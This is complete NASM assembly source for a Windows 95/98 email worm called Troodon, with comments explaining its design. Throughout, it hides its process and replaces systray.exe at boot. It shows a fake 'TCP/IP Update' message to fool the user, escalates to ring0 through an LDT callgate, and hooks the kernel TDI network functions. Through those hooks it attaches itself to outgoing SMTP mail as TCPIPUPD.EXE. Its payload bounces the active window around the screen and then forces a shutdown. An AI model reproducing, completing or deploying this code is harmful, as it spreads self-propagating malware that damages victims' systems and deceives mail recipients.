;   I-Worm.Win9X.Troodon Project
;-----------------------------------------
;  Technical details:
;   This is an Win95/98 specific Internet-Worm, witch spreads trough e-mail.
;   When executed it does more things in ring3 and ring0 too.
;   - ring3 actions -
;       - it looks very similar with a normal Windows application witch has a window etc.
;       So it has a window and a message loop. This is needed by the payload witch will activate
;       on a specific date (check code). When payload is triggered the foreground window on the desktop
;       will start bounce arround on the screen, for 30 seconds then Windows will shutdown.
;       This is the payload part, it will activate only if it is running under the name "systray.exe"
;       - when starting it checks if already installed in the system: checks if it's name is "systray.exe".
;       If not, then it copies itself in System directory under the name "systray.me", by using wininit.ini
;       systray.exe will be replaced by systray.me on next startup, and original systray.exe will be saved
;       in systray.sys.
;       If the name isn't systray.exe then it will show a message to fool the user all is ok.
;       If the name is systray.exe then it will run the saved systray.sys using WinExec and it will assume
;       that it is already installed in the system.
;       - it will encoded current process'es file in base64 and save it in memory allocated with VirtualAlloc
;       - it will check for signature in memory at 0xC000E990
;       If not in memory then it will jump into ring0 by using a callgate method described by Zombie,
;       by patching LDT table.
;
;   - ring0 actions -
;       - it allocates memory in ring0 for it's own code and for encoded file.
;       - it copies itself and the encoded file in there (after jumping back into ring3 the memory used for
;       encoded file will be free.
;       - it will hook TdiConnect, TdiSend, TdiCloseConnection, TdiDisconnect for it's own use.
;       - it will monitor all outgoing connections checking for SMTP (port 25) connections.
;       - when it find one it will wait for DATA command for SMTP server
;       - then it will check the content of the e-mail, if it is a MIME formated e-mail containing
;       text/plain or text/html or both it will modify the message attaching it's own code (encoded in base64)
;       to the mail.
;
;   It has it's own string routines.
;   Things I didn't do in this version are: doesn't attach to mails that already have attachements, and to mails
;   with no MIME content.
;
;
;   This is done using NASM syntax.
;   Compilation and linking:
;       NASMW -f win32 v.asm
;       GORC /r vres.rc
;       ALINK -entry start -oPE v.obj vres.res kernel32.lib user32.lib gdi32.lib


extern ExitProcess
extern RegisterServiceProcess
extern GetModuleHandleA
extern GetModuleFileNameA
extern CopyFileA
extern DeleteFileA
extern WritePrivateProfileStringA
extern WinExec
extern VirtualAlloc
extern VirtualFree
extern CreateFileA
extern GetFileSize
extern CloseHandle
extern CreateFileMappingA
extern MapViewOfFile
extern UnmapViewOfFile
extern MessageBoxA
extern GetForegroundWindow
extern GetWindowRect
extern MoveWindow
extern RegisterClassA
extern CreateWindowExA
extern ShowWindow
extern UpdateWindow
extern GetMessageA
extern TranslateMessage
extern DispatchMessageA
extern PostQuitMessage
extern DefWindowProcA
extern SetTimer
extern GetLocalTime
extern ExitWindowsEx
extern GetSystemDirectoryA
extern lstrcatA

%include "win32n.inc"
%include "vxdn.inc"

@@VTDI_Get_Version      equ     004880000h
@@VTDI_Get_Info         equ     004880008h
ID_TIMER1               equ     100
ID_TIMER2               equ     101
step                    equ     2

global start

[bits 32]
[section .text]

start:
%define ebp_hInstance       ebp+8   ; handle of current instance
%define ebp_hPrevInstance   ebp+0ch ; handle of previous instance
%define ebp_lpszCmdLine     ebp+10h ; pointer to command line
%define ebp_nCmdShow        ebp+14h ; show state of window

        push ebp
        mov ebp,esp

        ;  hide the process even if it stay just a bit in memory,
        ;  just to be sure that no quick eye see it
        push    dword 1
        push    dword 0
        call    RegisterServiceProcess

        ; get module handle
        push    dword 0
        call    GetModuleHandleA

        ; get module file name
        push    dword [path_len]
        push    dword my_path
        push    eax
        call    GetModuleFileNameA

        ; make paths; %SYSDIR% + filenames
        call    make_paths

        ; Register Window Class
        mov eax, [ebp_hInstance]
        mov [WindowClassStruc+WNDCLASS.hInstance], eax
        mov dword [WindowClassStruc+WNDCLASS.hIcon], 0
        mov dword [WindowClassStruc+WNDCLASS.hCursor], 0

        push    dword WindowClassStruc
        call    RegisterClassA

        test    eax,eax
        jnz .Success

.Fail:  jmp FareWell

.Success:

MakeWindow: ; create the window
        push    dword 0
        push    dword [ebp_hInstance]
        push    dword 0
        push    dword 0
        push    dword 200
        push    dword 200
        push    dword 10
        push    dword 10
        push    dword WS_OVERLAPPEDWINDOW
        push    dword WindowTitle
        push    dword ClassName
        push    dword WS_EX_OVERLAPPEDWINDOW
        call    CreateWindowExA

        test    eax,eax
        jnz .Success

.Fail:  jmp FareWell

.Success:   mov [WindowHandle], eax
        push    dword SW_HIDE
        push    dword [WindowHandle]
        call    ShowWindow

        push    eax
        call    UpdateWindow
    
MsgLoop:    ; the message loop
        push    dword 0
        push    dword 0
        push    dword 0
        push    dword WindowMSG
        call    GetMessageA

        or  eax,eax
        jz  FareWell

        push    dword WindowMSG
        call    TranslateMessage

        push    dword WindowMSG
        call    DispatchMessageA
    
        jmp MsgLoop

FareWell:   push    dword 0
        call    ExitProcess
        
WndProc:
%define ebp_hWnd   ebp+8        ; handle of window
%define ebp_Msg    ebp+0ch      ; message
%define ebp_wParam ebp+10h      ; first message parameter
%define ebp_lParam ebp+14h      ; second message parameter
%define ebp_DC    ebp-4

        push    ebp
        mov ebp,esp

        cmp dword [ebp_Msg], WM_CREATE
        jz  Create_Handler
        cmp dword [ebp_Msg], WM_TIMER
        jnz .next_2
        jmp Timer_Handle
.next_2:    cmp dword [ebp_Msg], WM_DESTROY
        jnz .next_1
        jmp Destroy_Handler
.next_1:

.DefMsgHandler:
        push    dword [ebp_lParam]
        push    dword [ebp_wParam]
        push    dword [ebp_Msg]
        push    dword [ebp_hWnd]
        call    DefWindowProcA

.Exit:  mov esp,ebp
        pop ebp
        ret 0x0C

Create_Handler:
        ; check if the name of the file is "systray.exe"
        call    check_systray

        ; THIS is the call the installs the i-worm "engine" in memory
        call    iworm

        push    dword STime
        call    GetLocalTime

        cmp byte [systray_ornot], 1     ; "myself" is systray.exe
        je  .next_1

        ; Get out
        push    dword 0
        call    ExitProcess

.next_1:    ; next is for payload
        cmp word [STime+SYSTEMTIME.wDayOfWeek], 6
        jne .exit

        push    dword 0
        push    dword 1
        push    dword ID_TIMER1
        push    dword [ebp_hWnd]
        call    SetTimer

        push    dword 0
        push    dword 300000
        push    dword ID_TIMER2
        push    dword [ebp_hWnd]
        call    SetTimer

.exit:  jmp WndProc.Exit

Timer_Handle:
        ; this is for payload again
        cmp dword [ebp_wParam], ID_TIMER1
        jnz .next_1
        jmp .timer_1
.next_1:    cmp dword [ebp_wParam], ID_TIMER2
        jnz .next_2
        jmp .timer_2
.next_2:    jmp WndProc.Exit

.timer_1:   ; get forground window
        call    GetForegroundWindow
        mov dword [hWnd], eax

        ; "Restore" window
        push    dword SW_RESTORE
        push    eax
        call    ShowWindow

        ; get window position and size
        push    dword rect
        push    dword [hWnd]
        call    GetWindowRect

        ; move it
        push    dword 1
        mov eax, [rect+RECT.bottom]
        sub eax, [rect+RECT.top]
        push    eax
        mov eax, [rect+RECT.right]
        sub eax, [rect+RECT.left]
        push    eax
        mov eax, [rect+RECT.top]
        add eax, [y]
        push    eax
        mov eax, [rect+RECT.left]
        add eax, [x]
        push    eax
        push    dword [hWnd]
        call    MoveWindow

        mov eax, [rect+RECT.right]
        cmp eax, 1014
        jg  .dec_x
        mov eax, [rect+RECT.left]
        cmp eax, 10
        jb  .inc_x
        jmp .done_x
.dec_x: mov dword [x], -step
        jmp .done_x
.inc_x: mov dword [x], step
.done_x:

        mov eax, [rect+RECT.bottom]
        cmp eax, 758
        jg  .dec_y
        mov eax, [rect+RECT.top]
        cmp eax, 10
        jb  .inc_y
        jmp .done_y
.dec_y: mov dword [y], -step
        jmp .done_y
.inc_y: mov dword [y], step
.done_y:    jmp WndProc.Exit

.timer_2:   push    dword 0
        push    dword EWX_SHUTDOWN
        call    ExitWindowsEx

        jmp WndProc.Exit


Destroy_Handler:
        push    dword 0
        call    PostQuitMessage
        jmp WndProc.Exit

        jmp WndProc.DefMsgHandler




;------------------------------------------------------------
;  Here starts the part witch makes this an I-Worm
;------------------------------------------------------------
iworm:  pushad

        ; encode in base64 the file
        mov esi, my_path
        call    encode

        cmp byte [systray_ornot], 1
        jne .not_systray
        jmp .systray

.not_systray:   ; it isn't installed in the system, so install it
        ; copy myself into 'systray.me'
        push    dword 0
        push    dword systray.me
        push    dword my_path
        call    CopyFileA

        ; write wininit.ini, so next time windows will start it will
        ; rename systray.exe into systray.sys and systray.me into systray.exe
        push    dword wininit.ini
        push    dword systray.exe
        push    dword systray.sys
        push    dword rename
        call    WritePrivateProfileStringA

        push    dword wininit.ini
        push    dword systray.me
        push    dword systray.exe
        push    dword rename
        call    WritePrivateProfileStringA

        push    dword 0x00000030
        push    dword msgCaption
        push    dword msgContent
        push    dword 0
        call    MessageBoxA
        jmp .systray_over

.systray:   ; run the original systray.exe (systray.sys)
        push    dword 0
        push    dword systray.sys
        call    WinExec

.systray_over:
        ;  signature
        mov eax, 0xC000E990         ; check if already there
            cmp dword [eax], 'WORM'

        ;  if not resident, goto not_res
            jne not_res

        ;  else get out
        jmp out_of_here

not_res:    ;  jump into ring0

        mov esi, Ring0Proc
        call    callgate

        ; free the allocated mem
        call    close_encode

out_of_here:; job done, time to let it go
        popad
        ret

;------------------------------------------------------------
;  Ring0Proc
;------------------------------------------------------------
Ring0Proc   pushf
        pushad

        ; calculate code size
        mov eax, end
        sub eax, start
        add eax, 0x100
        mov [codesize], eax

        ; alloc mem for encoded file
        VxDCall _HeapAllocate, dword [encoded_size], dword HEAPZEROINIT
        mov [heap_enc_addr], eax

        ; copy it there
        mov esi, dword [encoded_addr]
        mov edi, eax
        mov ecx, dword [encoded_size]
        repz    movsb

        ; alloc some memory
        VxDCall IFSMgr_GetHeap, dword [codesize]
        mov [codeaddr], eax

        ; copy the code
        mov esi, start
        mov edi, eax
        mov ecx, [codesize]
        repz    movsb

        ; make the hooks and stay in there
        mov eax, [codeaddr]
        add eax, heap_code - start
        call    eax

.exit:  ; time to say good bye
        popad
        popf
        retf


;------------------------------------------------------------
;  This code will be executed only in heap
;------------------------------------------------------------
heap_code:  pushf
        pushad

        mov eax, 0xC000E990         ; mark "already there"
            mov dword [eax], 'WORM'
        call    TdiHook

        popad
        popf
        ret


;------------------------------------------------------------
;  TdiHook
;------------------------------------------------------------
TdiHook:    ; now i need to hook the TDI functions i need
        pushad

        mov ebp, [codeaddr]
        sub ebp, start

        ; Make sure VTDI is present
        VxDCall VTDI_Get_Version
        jnc .cont_1
        jmp .exit
.cont_1:

        ; Get a pointer to TCP dispatch table
        lea eax, [ebp + TCPName]
        push    eax
        VxDCall VTDI_Get_Info
        add esp, 4

        ; Save the address of dispatch table
        lea esi, [ebp + TdiDispatchTable]
        mov [esi], eax
        cmp eax, 0
        ; if error get out
        jne .cont_2
        jmp .exit
.cont_2:

        ; ---------- Hook TdiConnect ----------
        mov ebx, [eax + 0x18]
        lea esi, [ebp + TdiConnect_PrevAddr]
        mov [esi], ebx

        ; patch some things in it
        lea edi, [ebp + TdiConnect_Jmp]
        mov [edi], esi

        lea edi, [ebp + TdiConnect_Delta]
        mov esi, [codeaddr]
        mov [edi], esi

        lea ebx, [ebp + TdiConnect_Hook]
        mov [eax + 0x18], ebx

        ; ---------- Hook TdiSend ----------
        mov ebx, [eax + 0x2C]
        lea esi, [ebp + TdiSend_PrevAddr]
        mov [esi], ebx

        ; patch some things in it
        lea edi, [ebp + TdiSend_Jmp]
        mov [edi], esi

        lea edi, [ebp + TdiSend_Delta]
        mov esi, [codeaddr]
        mov [edi], esi

        lea ebx, [ebp + TdiSend_Hook]
        mov [eax + 0x2C], ebx

        ; ---------- Hook TdiDisconnect ----------
        mov ebx, [eax + 0x1C]
        lea esi, [ebp + TdiDisconnect_PrevAddr]
        mov [esi], ebx

        ; patch some things in it
        lea edi, [ebp + TdiDisconnect_Jmp]
        mov [edi], esi

        lea edi, [ebp + TdiDisconnect_Delta]
        mov esi, [codeaddr]
        mov [edi], esi

        lea ebx, [ebp + TdiDisconnect_Hook]
        mov [eax + 0x1C], ebx

        ; ---------- Hook TdiCloseConnection ----------
        mov ebx, [eax + 0x0C]
        lea esi, [ebp + TdiCloseConnection_PrevAddr]
        mov [esi], ebx

        ; patch some things in it
        lea edi, [ebp + TdiCloseConnection_Jmp]
        mov [edi], esi

        lea edi, [ebp + TdiCloseConnection_Delta]
        mov esi, [codeaddr]
        mov [edi], esi

        lea ebx, [ebp + TdiCloseConnection_Hook]
        mov [eax + 0x0C], ebx

.exit:      popad
        ret

;------------------------------------------------------------
;  TdiConnect_Hook
;------------------------------------------------------------
TdiConnect_Hook:; MOV   EDI, <address_of_code_in_heap>
        db  0xBF
TdiConnect_Delta:dd 0
        sub edi, start

        push    ebp
        mov ebp, esp

        pushf
        pushad

        mov esi, [ebp + 0x10]       ; esi = *RequestAddr
        mov esi, [esi + 0x14]       ; esi = *RemoteAddr
        cmp word [esi + 0x06], 2        ; TDI_ADDRESS_TYPE_IP
        jne TdiConnect_Hook_Jmp

        ;  check if the connection is to an SMTP server
        mov ax, word [esi + 0x08]
        cmp ax, 0x1900          ; smtp ?
        je  .smtp_on

        ;  if not, get out
        jmp TdiConnect_Hook_Jmp

.smtp_on:   ;mov    byte [edi + Trace], 1
        mov eax, [ebp + 0x08]
        mov eax, [eax]
        mov dword [edi + TraceHandle], eax

TdiConnect_Hook_Jmp:
        popad
        popf

        pop ebp

;       jmp [TdiConnect_Jmp]
        db  0xFF, 0x25
TdiConnect_Jmp: dd  0


;------------------------------------------------------------
;  TdiSend_Hook
;------------------------------------------------------------
TdiSend_Hook:
        push    ebp
        mov ebp, esp

        pushf
        pushad

        ; MOV   EDI, <address_of_code_in_heap>
        db  0xBF
TdiSend_Delta:  dd  0
        sub edi, start

        ; check if we trace the correct connection
        mov eax, [ebp + 0x08]
        mov eax, [eax]
        cmp [edi + TraceHandle], eax
        je  .jump_over
        jmp .exit
.jump_over:
        ; so we are tracing our SMTP connection
        ; get the buffer length and address

        mov ebx, [ebp + 0x10]
        mov eax, [ebp + 0x14]       ; eax = *SendBuffer
        mov esi, [eax + 0x04]       ; esi = source buffer
        mov ecx, [eax + 0x0C]       ; ecx = length
        mov [edi + sourcebuf], esi
        mov [edi + buflen], ecx

        ; check NextIsMail flag
        cmp byte [edi + NextIsMail], 1
        je  .Mail

        lea edx, [edi + search_str]
        call    strncmpi

        test    eax, eax
        je  .pass_1
        jmp .exit
.pass_1:
        ; set NextIsMail flag
        ;   This flag is set when the DATA instruction for SMTP server is sent.
        ;   DATA command is sent before sending the mail body.
        mov byte [edi + NextIsMail], 1

        jmp .exit

.Mail:  ; reset NextIsMail flag
        mov byte [edi + NextIsMail], 0

        ; search in the mail for "Content-Type" string
        ; ESI = buffer source
        ; ECX = buffer length

        lea edx, [edi + strContentType]
        push    esi             ; save ESI
        push    edx             ;
        pop esi             ; ESI = EDX
        call    strlen
        pop esi             ; restore ESI
        push    eax             ;
        pop ecx             ; ECX = EAX

        mov ebx, [edi + buflen]
.next:  call    strncmpi
        test    eax, eax
        jz  .found_1
        inc esi
        dec ebx
        test    ebx, ebx
        jz  .not_found_1
        jmp .next

.not_found_1:
        jmp .exit

.found_1:   mov [edi + mark1], esi      ; save the position of "Content-Type" witch is the begin of the text mail

        add esi, ecx
        cmp byte [esi], ' '
        jne .pass_2
        inc esi

.pass_2:    ; ESI points after "Content-Type:"
        ; check if Content-Type is text/plain -> this mean the e-mail is a simple text mail
        lea edx, [edi + strTextPlain]
        push    esi
        push    edx
        pop esi
        call    strlen
        push    eax
        pop ecx
        pop esi

        call    strncmpi
        test    eax, eax
        jne .not_textplain
        mov byte [edi + mailtype], 1    ; text/plain
        jmp .go_for_it

.not_textplain:
        lea edx, [edi + strMultipartAlternative]
        push    esi
        push    edx
        pop esi
        call    strlen
        push    eax
        pop ecx
        pop esi

        call    strncmpi
        test    eax, eax
        jne .not_multipartalternative
        mov byte [edi + mailtype], 2        ; text/plain + text/html
        jmp .go_for_it

.not_multipartalternative:
        lea edx, [edi + strMultipartMixed]
        push    esi
        push    edx
        pop esi
        call    strlen
        push    eax
        pop ecx
        pop esi

        call    strncmpi
        test    eax, eax
        jne .not_multipartmixed
        mov byte [edi + mailtype], 3        ; text + probably attachement
;       jmp .go_for_it
.not_multipartmixed:
        jmp .exit

.go_for_it: ; EIP reached here if the e-mail is text/plain
        ; find the end of mail and save it
        mov esi, [edi + sourcebuf]
.again_1:   cmp byte [esi], 0
        je  .found_2
        inc esi
        jmp .again_1
.found_2:   mov [edi + mark2], esi

        ; Get some memory for the new e-mail
        mov ecx, [edi + buflen]
;       add ecx, [edi + newmaillen]
        add ecx, 15000
        VMMcall _HeapAllocate, ecx, dword HEAPZEROINIT
        test    eax, eax
        jnz .pass_3
        jmp .exit
.pass_3:    mov [edi + newmailaddr], eax

        ; copy until original "Content-Type"
        mov esi, [edi + sourcebuf]
        mov edx, eax
        mov ecx, [edi + mark1]
        sub ecx, esi
        call    strncpy
        add edx, ecx

        ; copy my multipart/mixed header
        lea esi, [edi + myMultipartMixed]
        call    strlen
        mov ecx, eax
        call    strncpy
        add edx, ecx

        ; copy my boundary name
        lea esi, [edi + myBoundary]
        call    strlen
        mov ecx, eax
        call    strncpy
        add edx, ecx

        ; copy my used boundary name
        lea esi, [edi + myUseBoundary]
        call    strlen
        mov ecx, eax
        call    strncpy
        add edx, ecx

        ; copy original mail
        mov esi, [edi + mark1]
        mov ecx, [edi + mark2]
        sub ecx, esi
        call    strncpy
        add edx, ecx

        ; copy my used boundary name
        lea esi, [edi + myUseBoundary]
        call    strlen
        mov ecx, eax
        call    strncpy
        add edx, ecx

        ; copy attachement header
        lea esi, [edi + myAttachHeader]
        call    strlen
        mov ecx, eax
        call    strncpy
        add edx, ecx

        ; base64 encoded file copy
        mov esi, [edi + heap_enc_addr]
        mov ecx, [edi + encoded_size]
        call    strncpy
        add edx, ecx

        ; close boundary
        lea esi, [edi + myEndBoundary]
        call    strlen
        mov ecx, eax
        call    strncpy

        ; set new source buffer address
        mov esi, [ebp + 0x14]       ; eax = *SendBuffer
        mov eax, [edi + newmailaddr]
        mov [esi + 0x04], eax       ; source buffer
        ; set new buffer length
        push    esi
        mov esi, [edi + newmailaddr]
        call    strlen
        pop esi

        mov ebx, esi
        add ebx, eax
        cmp byte [ebx], 0
        jne .set_len
        dec eax
.set_len:   mov [esi + 0x0C], eax       ; buffer length
        mov [ebp + 0x10], eax       ; buffer length

.exit:  popad
        popf

        pop ebp

;       jmp [TdiSend_Jmp]
        db  0xFF, 0x25
TdiSend_Jmp dd  0


;------------------------------------------------------------
;  TdiDisconnect_Hook
;------------------------------------------------------------
TdiDisconnect_Hook:
        push    ebp
        mov ebp, esp

        pushf
        pushad

        ; MOV   EDI, <address_of_code_in_heap>
        db  0xBF
TdiDisconnect_Delta:
        dd  0
        sub edi, start

        ; check if disconnecting our connection
        mov eax, [edi + TraceHandle]
        cmp [ebp + 0x08], eax
        jne .exit

        ; free the memory
        mov eax, [edi + newmailaddr]
        VMMcall _HeapFree, eax, dword 0

.exit:  popad
        popf

        pop ebp

;       jmp [TdiDisconnect_Jmp]
        db  0xFF, 0x25
TdiDisconnect_Jmp:dd    0


;------------------------------------------------------------
;  TdiCloseConnection_Hook
;------------------------------------------------------------
TdiCloseConnection_Hook:
        push    ebp
        mov ebp, esp

        pushf
        pushad

        ; MOV   EDI, <address_of_code_in_heap>
        db  0xBF
TdiCloseConnection_Delta:
        dd  0
        sub edi, start

        ; check if closing our connection
        mov eax, [edi + TraceHandle]
        cmp [ebp + 0x08], eax
        jne .exit

        ; free the memory
        mov     eax, dword [edi + newmailaddr]
        VMMcall _HeapFree, eax, dword 0

.exit:  popad
        popf

        pop ebp

;       jmp [TdiCloseConnection_Jmp]
        db  0xFF, 0x25
TdiCloseConnection_Jmp:
        dd  0


;------------------------------------------------------------
;  String comparation non case sensitive
;------------------------------------------------------------
;  Params:
;   ESI = source
;   EDX = destination
;   ECX = length
;  Return:
;   EAX = 0 if strings match
;   EAX = 1 if not match
;------------------------------------------------------------
strncmpi:   pushf
        pushad

.loop:  mov ah, byte [esi]
        mov al, byte [edx]
        
        ; if Caps Lock the make it non Caps
        cmp ah, 0x41        ; 'A'
        jge .great_then_A
        jmp .done_with_1
.great_then_A:
        cmp ah, 0x5A        ; 'Z'
        jbe .less_then_Z
        jmp .done_with_1
.less_then_Z:
        add ah, 0x20

.done_with_1:
        ; if Caps Lock the make it non Caps
        cmp al, 0x41        ; 'A'
        jge .great_then_A_2
        jmp .done
.great_then_A_2:
        cmp al, 0x5A        ; 'Z'
        jbe .less_then_Z_2
        jmp .done
.less_then_Z_2:
        add al, 0x20

.done:  ; now it should be lower case
        cmp ah, al
        jne .not_match

        inc esi
        inc edx
        loop    .loop

        ; if we are here then the strings are identical
        popad
        popf
        xor eax, eax
        jmp .exit

.not_match: ; if we are here then the strings are not identical
        popad
        popf
        mov eax, 1
.exit:  ret


;------------------------------------------------------------
;  String length
;------------------------------------------------------------
;  Params:
;   ESI = source
;  Return:
;   EAX = length
;------------------------------------------------------------
strlen: push    ebx
        push    ecx
        push    edx
        push    esi
        push    edi
        push    ebp

        xor ecx, ecx
.not_zero:  mov al, byte [esi]
        cmp al, 0
        je  .exit
        inc esi
        inc ecx
        jmp .not_zero
.exit:  mov eax, ecx

        pop ebp
        pop edi
        pop esi
        pop edx
        pop ecx
        pop ebx
        ret


;------------------------------------------------------------
;  String copy (length specified)
;------------------------------------------------------------
;  Params:
;   ESI = source
;   EDX = destination
;   ECX = length
;------------------------------------------------------------
strncpy:    pushf
        pushad
        cld
        mov edi, edx
        repz    movsb
.exit:  popad
        popf
        ret


;------------------------------------------------------------
;  Encode in base64 the file
;------------------------------------------------------------
;  Params:
;   ESI = source filename
;  Return:
;   EAX = address of encoded buffer
;   ECX = size of encoded file
;------------------------------------------------------------
encode: pushad

        ; copy it, so we have read-write access
        ; (if the program is started then we have readonly access)
        push    dword 0
        push    dword tempFileName
        push    esi
        call    CopyFileA
        mov esi, tempFileName

        ; open file
        push  dword 0
        push  dword 0
        push  dword 3
        push  dword 0
        push  dword 1
        push  dword 0xC0000000      ; GENERIC_READ | GENERIC_WRITE
        push  esi
        call    CreateFileA
        mov dword [hFile], eax

        ; get file size
        push    dword 0
        push    eax
        call    GetFileSize
        mov dword [dwFileSize], eax

        ; pad the file with [0,2] zeroes
        ; add [0,2] to file size
        xor edx, edx
        mov ebx, 0x00000003
        div ebx

        ; remainder 0 ? (div by 3?)
        mov dword [pad_no], 0
        test    edx, edx
        je  .size_ok

        mov dword [pad_no], edx
        add dword [dwFileSize], edx

        ; dwBufSize = dwFileSize * 3 (base64 may be 3 times bigger then the original)
        mov eax, [dwFileSize]
        mov edx, 0x00000003
        mul edx
        mov dword [dwBufSize], eax
        jmp .fixed_size

.size_ok:   mov eax, [dwFileSize]
        mov edx, 0x00000003
        mul edx
        mov dword [dwBufSize], eax

.fixed_size:    ; alloc some memory
        push    dword 0x00000004
        push    dword 0x00001000
        push    dword [dwBufSize]
        push    dword 0x00000000
        call    VirtualAlloc
                test    eax, eax
        jne .pass_1
        jmp .exit
.pass_1:    mov dword [encoded_addr], eax

        ; create file mapping
        push    dword 0
        push    dword [dwFileSize]
        push    dword 0
        push    dword 0x00000004        ; PAGE_READWRITE
        push    dword 0
        push    dword [hFile]
        call    CreateFileMappingA
        mov dword [hMap], eax

        ; map view of file
        push    dword [dwFileSize]
        push    dword 0
        push    dword 0
        push    dword 0x00000002        ; FILE_MAP_WRITE
        push    eax
        call    MapViewOfFile
        mov dword [pMap], eax

        mov ecx, dword [pad_no]
        test    ecx, ecx
        je  .size_ok_2

        mov esi, eax
        add esi, dword [dwFileSize]
        sub esi, ecx

.loop_2:    mov byte [esi], '0'
        dec ecx
        test    ecx, ecx
        jne .loop_2

.size_ok_2: ; start encoding
        mov eax, dword [pMap]
        mov edx, dword [encoded_addr]
        mov ecx, dword [dwFileSize]
        add ecx, dword [pad_no]

        xor esi, esi
        mov edi, encTable

.loop:  xor ebx, ebx
        mov bl, byte [eax]
        shr bl, 2
        and bl, 00111111b
        mov bh, byte [edi + ebx]
        mov byte [edx + esi], bh
        inc esi

        mov bx, word [eax]
        xchg    bl, bh
        shr bx, 4
        mov bh, 0
        and bl, 00111111b
        mov bh, byte [edi + ebx]
        mov byte [edx + esi], bh
        inc esi

        inc eax
        mov bx, word [eax]
        xchg    bl, bh
        shr bx, 6
        mov bh, 0
        and bl, 00111111b
        mov bh, byte [edi + ebx]
        mov byte [edx + esi], bh
        inc esi

        inc eax
        xor ebx, ebx
        mov bl, byte [eax]
        and bl, 00111111b
        mov bh, byte [edi + ebx]
        mov byte [edx + esi], bh
        inc esi
        inc eax

        sub ecx, 3
        cmp ecx, 0
        jne .loop

        mov dword [encoded_size], esi

        push    dword [pMap]
        call    UnmapViewOfFile

        push    dword [hMap]
        call    CloseHandle

        push    dword [hFile]
        call    CloseHandle

.exit:  push    dword tempFileName
        call    DeleteFileA

        popad
        mov eax, dword [encoded_addr]
        mov ecx, dword [encoded_size]
        ret


;------------------------------------------------------------
;  Close encode (free allocated memory)
;------------------------------------------------------------
close_encode:   pushad
        push    dword [encoded_addr]
        push    dword 0x00000000
        push    dword 0x00008000
        call    VirtualFree
        popad
        ret


;------------------------------------------------------------
;  Ring 0 Callgate
;------------------------------------------------------------

CGS     equ 8

callgate:   pushad
        push    ebx
        sgdt    [esp - 0x02]
        pop ebx
        xor eax, eax
        sldt    ax
        and al, 0xF8

        add ebx, eax

        mov ch, byte [ebx + 0x07]
        mov cl, byte [ebx + 0x04]
        shl ecx, 0x10
        mov cx, word [ebx + 0x02]

        lea edi, [ecx + CGS]
        cld

        mov eax, esi
        stosw
        mov eax, 0xEC000028
        stosd
        shld    eax, esi, 0x10
        stosw

        popad

        db  0x9A        ; call 28:<esi>
        dd  0       ; unused
        dw  CGS+100b+11b    ; LDT+R3

        ret


;------------------------------------------------------------
;  Check if systray
;------------------------------------------------------------
check_systray:
        pushad

        ; check if in the name already exists 'systray.exe' witch means
        ; it is already installed in the system
        mov esi, my_path
        mov edx, systray_exe
        mov ecx, dword [systray_exe_len]
        mov ebx, 300
        sub ebx, dword [systray_exe_len]

.systray_again:
        call    strncmpi
        dec ebx
        test    ebx, ebx
        je  .not_systray
        inc esi
        test    eax, eax
        jne .systray_again
        jmp .systray

.not_systray:
        popad
        mov byte [systray_ornot], 0
        ret

.systray:   popad
        mov byte [systray_ornot], 1
        ret


;------------------------------------------------------------
;  Make paths for use in installation etc.
;------------------------------------------------------------
make_paths: pushad
        push    dword 260
        push    dword systray.exe
        call    GetSystemDirectoryA

        push    dword 260
        push    dword systray.sys
        call    GetSystemDirectoryA

        push    dword 260
        push    dword systray.me
        call    GetSystemDirectoryA

        push    dword systray.exe_
        push    dword systray.exe
        call    lstrcatA

        push    dword systray.sys_
        push    dword systray.sys
        call    lstrcatA

        push    dword systray.me_
        push    dword systray.me
        call    lstrcatA

        popad
        ret





;beep:      pushad
;       mov ax, 1000
;       mov bx, 200
;       mov cx, ax
;       mov al, 0xB6
;       out 0x43, al
;       mov dx, 0x0012
;       mov ax, 0x34DC
;       div cx
;       out 0x42, al
;       mov al, ah
;       out 0x42, al
;       in  al, 0x61
;       mov ah, al
;       or  al, 0x03
;       out 0x61, al
;l1:        mov ecx, 4680
;l2:        loop    l2
;       dec bx
;       jnz l1
;       mov al, ah
;       out 0x61, al
;
;       popad
;       ret

[section .data]
my_path         times   300 db 0
path_len            dd  300
systray.exe         times   260 db 0
systray.exe_        db  '\systray.exe', 0
systray.sys         times   260 db 0
systray.sys_        db  '\systray.sys', 0
systray.me          times   260 db 0
systray.me_         db  '\systray.me', 0
wininit.ini         db  'wininit.ini', 0
rename          db  'Rename', 0
systray_exe         db  'SYSTRAY.EXE', 0
systray_exe_len     dd  11          ; size of the string above
tempFileName        db  '\systray.tmp', 0
systray_ornot       db  0   ; 0 - "myself" isn't systray.exe :)
                        ; 1 - "myself" is systray.exe :)

msgCaption          db  'Windows TCP/IP Update', 0
msgContent          db  "The system doesn't need an update.", 13, 10
                db  'Latest version of TCP/IP already present.', 0

hFile               dd  0
hMap                dd  0
pMap                dd  0
dwFileSize          dd  0
dwBufSize           dd  0
encoded_addr        dd  0
heap_enc_addr       dd  0
encoded_size        dd  0
encTable            db      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
pad             db      '='
pad_no          dd  0
mailtype            db  0

codeaddr            dd  0
codesize            dd  0

TCPName         db  'MSTCP', 0
TdiDispatchTable        dd  0
TdiConnect_PrevAddr dd  0
TdiSend_PrevAddr        dd  0
TdiDisconnect_PrevAddr  dd  0
TdiCloseConnection_PrevAddr dd  0
TraceHandle         dd  0
NextIsMail          db  0
sourcebuf           dd  0
buflen              dd  0
search_str          db  'DATA', 0x0D, 0x0A, 0
newmailaddr         dd  0
;newmaillen         dd  0

strContentType      db  'Content-Type:', 0
strMultipartAlternative db  'multipart/alternative', 0
strMultipartMixed       db  'multipart/mixed', 0
strTextPlain        db  'text/plain', 0
strTextHtml         db  'text/html', 0
strApp          db  'application/x-msdownload', 0

mark1               dd  0
mark2               dd  0

myMultipartMixed        db  'Content-Type: multipart/mixed;', 13, 10, 0
myBoundary          db  9, 'boundary="----This_is_created_by_VX_e-mail_service"', 13, 10, 0
myUseBoundary       db  13, 10, '------This_is_created_by_VX_e-mail_service', 13, 10, 0
myAttachHeader      db  'Content-Type: application/x-msdownload;', 13, 10
                db  9, 'name="TCPIPUPD.EXE"', 13, 10
                db  'Content-Transfer-Encoding: base64', 13, 10
                db  'Content-Disposition: attachement;', 13, 10
                db  9, 'filename="TCPIPUPD.EXE"', 13, 10, 13, 10, 0
myEndBoundary       db  13, 10, '------This_is_created_by_VX_e-mail_service--', 13, 10, 0

hWnd                dd  0
WindowHandle        dd  0
ClassName           db  'I-Worm', 0
WindowTitle         db  'Troodon', 0
x               dd  step
y               dd  step
